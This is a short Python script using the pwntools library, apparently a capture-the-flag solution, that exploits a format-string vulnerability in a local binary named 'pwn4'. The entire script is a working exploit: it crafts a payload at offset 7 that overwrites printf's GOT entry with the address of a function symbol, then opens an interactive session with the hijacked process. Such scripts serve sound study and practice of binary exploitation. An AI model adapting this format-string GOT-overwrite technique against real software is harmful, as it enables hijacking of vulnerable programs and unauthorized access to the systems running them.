from pwn import *

e = ELF('./pwn4')
p = process('./pwn4')

___addr = e.symbols['__']
printf_addr = e.got['printf']

payload = fmtstr_payload(7,{printf_addr:___addr})

p.sendline(payload)
p.interactive()